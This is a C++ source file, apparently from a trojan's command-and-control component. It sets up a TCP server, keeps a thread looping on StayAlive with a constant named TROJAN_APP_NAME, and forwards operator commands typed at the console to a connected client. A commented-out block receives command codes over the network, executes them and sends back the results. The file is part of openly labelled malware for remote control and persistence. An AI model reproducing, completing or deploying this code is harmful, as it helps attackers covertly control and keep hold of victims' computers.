#include "..\Service\pch.hpp"

#include "Application.hpp"
#include "..\Network\TCPServer.hpp"
#include "..\Network\Protocols\CommandMessageProtocol.hpp"
#include "..\Service\Debugger.hpp"
#include "..\Service\Constants.h"
#include "..\Service\Tools.hpp"

Application::Application() :
	m_io(),
	m_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(DEFAULT_PORT)))),
	m_thread([this]() { m_io.run(); }),
	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
{ }

Application::Application(char *argv[]) :
	m_io(),
	m_server(new TCPServer(m_io, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), std::atoi(argv[1])))),
	m_thread([this]() { m_io.run(); }),
	m_save_thread([]() { for (;;) { StayAlive(TROJAN_APP_NAME); } })
{ }

Application::~Application()
{
	delete m_server;
}

void Application::run()
{
	m_server->accept();
	
	char line[CMPROTO::MAX_BODY_LENGTH + 1] = "";
	while (std::cin.getline(line, CMPROTO::MAX_BODY_LENGTH + 1))
	{
		CMPROTO msg;
		msg.set_body_length(std::strlen(line));
		std::memcpy(msg.get_body(), line + CMPROTO::HEADER_LENGTH, msg.get_body_length());
		msg.encode_header();

		m_server->write(&msg);
	}

	/*ClearConsole();

	std::string msg(TCP_MESSAGE_LENGTH, { });
	std::stringstream sstr;
	while (TRUE)
	{
		$I(TEXTH("Waiting for the client\n"));

		if(!m_pTCPServer->accept())
			return;

		$I(TEXTH("Connected\n"));
		while (TRUE)
		{
			if (!m_pTCPServer->recv(msg))
			{
				$INFO(TEXTH("%hs\n"), msg.c_str());

				break;
			}

			sstr << msg;
			INT code = static_cast<INT>(Command::UNDEFINEDCMD);
			sstr >> code;
			if (code == static_cast<INT>(Command::UNDEFINEDCMD))
			{
				$E(TEXTH("Undefined cmd code(%d)\n"), code);

				m_pTCPServer->send(TASK_FAILUREA);

				break;
			}

			std::string args = msg.substr(CMD_LENGTH);
			m_pTCPServer->send(ExecuteCommand(code, args));
			sstr.str(std::string());
			msg.resize(TCP_MESSAGE_LENGTH, { });
		}

		if(!m_pTCPServer->close_client_socket())
			return;

		$I(TEXTH("Client disconnected\n"));

		system("pause"); // SleepEx(10000, FALSE);
		ClearConsole();
	}*/
}

void Application::close()
{
	m_thread.join();
	m_save_thread.join();
}
